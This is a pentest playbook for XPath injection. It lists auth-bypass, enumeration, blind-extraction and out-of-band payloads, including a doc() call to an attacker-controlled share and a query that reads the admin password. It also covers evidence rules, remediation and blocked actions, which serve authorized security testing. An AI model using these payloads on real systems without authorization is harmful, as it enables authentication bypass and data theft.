# XPATH Injection — Playbook

## Vulnerability Description

**OWASP:** A03:2021 — Injection
**CWE:** CWE-643 (Improper Neutralization of Data within XPath Expressions)

XPATH injection occurs when untrusted input is concatenated into an XPath query used to
query an XML document (often an XML data store or an XML-based config). Because XPath has
no parameterized query API in many stacks, applications commonly build expressions like
`/users/user[name/text()='"+user+"']`. An attacker can alter the expression to bypass
authentication, enumerate the whole document, or extract fields that the app would not
normally return.

---

## Types

| Type | Description | Detection Method |
|---|---|---|
| **Auth bypass** | Alter XPath so the predicate always matches | `' or '1'='1` in the name/password field |
| **Document enumeration** | Read nodes outside the expected path | `...'] | //* | //user[...` union tricks |
| **Blind** | No reflected data — infer via result-set size / timing | inject `or true()` vs `or false()` |
| **Error-based** | Malformed XPath surfaces a parser error / stack | `']` → XML parser exception |

---

## Detection

### Manual Payloads

```bash
# Classic auth-bypass (name field) — terminate the query, inject OR
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
" or "1"="1

# Always-true predicate
' or true()
" or true()

# Structure probes — count nodes / attributes / comments
/            //            //*         */*          @*
count(/child::node())
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1

# Path-bypass / union-style node reads
'] | //*[
'] | //user/*[contains(*,'
') and contains(../password,'c
') and starts-with(../password,'c
```

### Blind Extraction (string-length + substring)

```bash
# 1) Guess the length of a string field
' and string-length(account)=<SIZE> and '1'='1

# 2) Read a character at a position
' and substring(//user[userid=5]/username,2,1)='a' and '1'='1

# Compare with its numeric codepoint (for non-printable / escaped chars)
' and substring(//user[userid=5]/username,2,1)=codepoints-to-string(<INT_ORD>) and '1'='1
```

### Out-of-Band (OOB)

```bash
# Trigger a server-side fetch via doc() to an attacker-controlled share (authorize first)
http://target/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
```

### Testing Locations
- Login / authentication fields backed by an XML datastore or config
- Search / lookup by name, id, or attribute on XML-backed endpoints
- Any endpoint that returns XML or an attribute from an XML document

---

## Tools

| Tool | Purpose | Notes |
|---|---|---|
| **curl** | Primary manual injection | `curl -G --data-urlencode "name=' or '1'='1" ...` |
| **Burp Repeater** | Compare responses across payloads | via the in-scope HTTP proxy |
| **ffuf** | Fuzz the parameter with XPath payload wordlists | |
| **xmllint** | Locally validate/test XPath syntax offline | `xmllint --xpath` on the returned document |

---

## Internet Research

- `<product> xpath injection`
- `xpath injection cheat sheet`
- `CWE-643 XPath Injection PoC`
- `<product> xml datastore auth bypass`

---

## Safe Proof of Concept

```bash
# Boolean proof — compare true vs false predicate outcomes (no data written)
' or '1'='1    # expected: success / larger result set
' or '1'='2    # expected: failure / smaller result set

# Safe enumeration that stays inside the app's own data
'] | //user[name/text()='admin']/password/text()[  (only if proving disclosure is in scope)
```

Proof-of-concept rules:
- Prefer the read-only boolean true/false distinction over any data-extraction payload.
- Never modify or delete XML document contents.
- Do not use the result to pivot to unrelated systems; keep proof within the app's data.

---

## Evidence

Each finding should include:

```
Vulnerability: XPATH Injection (predicate bypass)
URL: https://target.com/login
Parameter: username
Payload: ' or '1'='1
Type: Boolean auth bypass

HTTP Request:
  POST /login HTTP/1.1
  Host: target.com
  Content-Type: application/x-www-form-urlencoded
  username=%27+or+%271%27%3D%271&password=x

Response (baseline):            HTTP login failed (invalid credentials)
Response (payload):             HTTP login succeeded (session issued)

Proof: injecting a boolean-always-true predicate into the username field
changed authentication from fail to succeed, proving input is embedded in an
unsanitized XPath expression.
Remediation: avoid string-concatenated XPath; validate/whitelist input,
run queries with least-privilege access to the XML store, and treat all XML
data as read-only for the query path.
```

---

## Evidence to Save

- Tool output → `$ENG_DIR/evidence/exploitation/xpath-injection/<finding>.*`
- Request/response pairs → `$ENG_DIR/evidence/exploitation/http/`
- Screenshots (if applicable) → `$ENG_DIR/evidence/exploitation/screenshots/`

---

## Remediation

| Measure | Description |
|---|---|
| **Avoid string-built XPath** | Use a safe/parameterized XPath API if the language offers one |
| **Validate and whitelist input** | Restrict allowed characters (letters, digits, underscore) in query values |
| **Least privilege on the XML store** | The query path should have read access to the minimum nodes |
| **Keep XML data separate from queries** | Do not allow expressions to reference arbitrary nodes |
| **Generic error handling** | Suppress XML parser error text and stack traces |
| **Prefer real datastores** | Move to a DB/SQL or object store with parameterized queries where feasible |

---

## Stop Conditions

- Injection reaches nodes outside the intended document subtree → record, do not exfiltrate.
- XML parser reveals server internals → note for reporting, do not repeat against production data.

## Blocked Actions

| Action | Risk |
|---|---|
| **Modifying/deleting XML document nodes** | Data integrity violation |
| **Extracting credentials or secrets from the XML store** | Data exfiltration |
| **Using enumerated data to access unrelated systems** | Lateral movement |
| **Crafting XPath with external entity access** | Leveraging into XXE — see the `xxe` playbook's blocked actions |